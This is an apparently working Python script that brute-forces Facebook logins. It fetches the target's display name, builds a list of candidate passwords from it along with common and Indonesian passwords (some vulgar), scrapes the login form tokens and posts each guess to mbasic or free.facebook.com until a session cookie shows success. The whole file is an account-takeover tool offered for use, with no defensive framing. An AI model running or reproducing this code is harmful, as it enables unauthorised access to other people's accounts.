from requests import *
from utilities import checkname
from re import *
import os

res = Session()

class BruteForce:
  def __init__(self) ->None:
    self.password = []
  def askTarget(self,url):
    if(os.name=='posix'):os.system('clear')
    else:os.system('cls')
    print(
      '''
 _____         _       
| __  |___ _ _| |_ ___ 
| __ -|  _| | |  _| -_|
|_____|_| |___|_| |___|

      '''
      )
    username = input(
      '(?) Input username/id target: '
      )
    name = checkname.Check.checkavailability(url+'/'+username)
    if(name in['Halaman Tidak Ditemukan']):
      exit(
        '(!) account not found'
        )
    elif(name in['Masuk Facebook | Facebook','Konten Tidak Ditemukan']):
      print(
        ' ! account not found, but you can enter account name here'
        )
      name = input(
        '(?) account name: '
        )
    else:
      name = name.replace(' | Facebook','')
    name = name.lower()
    passw = name.split(' ')
    self.password = [
      passw[0]+'123',passw[0]+'1234',passw[0]+'12345',passw[0]+'123456',passw[0]+'1122',passw[0]+'098',passw[0]+'5678',passw[0]+'2000',passw[0]+'2001',passw[0]+'2002',passw[0]+'2003',passw[0]+'2004',passw[0]+'2005',passw[0]+'2006',passw[0]+'2007',passw[0]+'cantik',passw[0]+'ganteng',name,'123456','password','rahasia','12345678','qwerty','123123','abc123','password1','iloveyou','1q2w3e4r','dragon','123321','rahasia','anjing','sayang','kontol','anjing12','anjing123','anjing1234','anjing1235','anjing123456','sayangkamu','sayang12','sayang123','sayang1234','sayang12345','sayang123456','kontol12','kontol123','kontol1234','kontol12345','kontol123456','doraemon','bismillah'
      ]
    for passbrute in self.password:
      try:
        get_ = res.get(url+'/login/device-based/regular/login/').content
        lsd = search(r'name="lsd" value="(.*?)"',str(get_))[1]
        jazoest = search(r'name="jazoest" value="(.*?)"',str(get_))[1]
        m_ts = search(r'name="m_ts" value="(.*?)"',str(get_))[1]
        li = search(r'name="li" value="(.*?)"',str(get_))[1]
      except:
        break
      login = res.post(url+'/login/device-based/regular/login/',data={
        'lsd':lsd,
        'jazoest':jazoest,
        'm_ts':m_ts,
        'li':li,
        'try_number':'0',
        'unrecognized_tries':'0',
        'email':username,
        'pass':passbrute,
        'login':'Masuk',
        'bi_xrwh':'0'
      }).content
      print(
        f'\r \n! Trying... {passbrute}',end=''
        )
      if 'c_user' in res.cookies.get_dict():
        print(f'\n\n(SUCCES PASSWORD FOUND) {username} - {passbrute}')
        break
      elif 'checkpoint' in res.cookies.get_dict():
        print(f'\n\n(SUCCES PASSWORD FOUND) {username} - {passbrute}')
      else:
        continue
      
    
  def askMethod(self):
    print(
      '''
           _   _         _ 
 _____ ___| |_| |_ ___ _| |
|     | -_|  _|   | . | . |
|_|_|_|___|_| |_|_|___|___|
                           
      '''
      )
    print(
      '(1) Facebook Mbasic (with internet Connection)\n(2) Facebook Free (without internet Connection)'
      )
    cursor = input(
      '(?) SELECT: '
      )
    while(cursor==''):
      cursor = input(
        '(?) SELECT: '
        )
    if(cursor in['01','1']):
      self.askTarget('https://mbasic.facebook.com')
    elif(cursor in['02','2']):
      self.askTarget('https://free.facebook.com')

if __name__ == '__main__':
  run = BruteForce()
  run.askMethod()